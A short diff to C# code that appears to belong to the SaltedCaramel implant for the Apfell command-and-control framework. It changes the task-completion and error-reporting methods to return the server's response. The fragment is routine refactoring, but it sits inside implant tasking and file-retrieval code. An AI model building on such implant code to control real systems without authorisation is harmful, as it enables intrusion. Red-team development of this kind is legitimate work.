@@ -39,18 +39,19 @@ namespace Apfell
             public abstract string RegisterAgent(SaltedCaramel.SCImplant agent);
 
             public abstract SCTask CheckTasking(SaltedCaramel.SCImplant agent);
-            public void SendComplete(string taskId)
+
+            public string SendComplete(string taskId)
             {
                 Debug.WriteLine($"[+] SendComplete - Sending task complete for {taskId}");
                 SCTaskResp completeResponse = new SCTaskResp(taskId, "{\"completed\": true}");
-                this.PostResponse(completeResponse);
+                return this.PostResponse(completeResponse);
             }
 
-            public void SendError(string taskId, string error)
+            public string SendError(string taskId, string error)
             {
                 Debug.WriteLine($"[+] SendError - Sending error for {taskId}: {error}");
                 SCTaskResp errorResponse = new SCTaskResp(taskId, "{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}");
-                this.PostResponse(errorResponse);
+                return this.PostResponse(errorResponse);
             }
 
             public abstract byte[] GetFile(string file_id, SaltedCaramel.SCImplant implant);
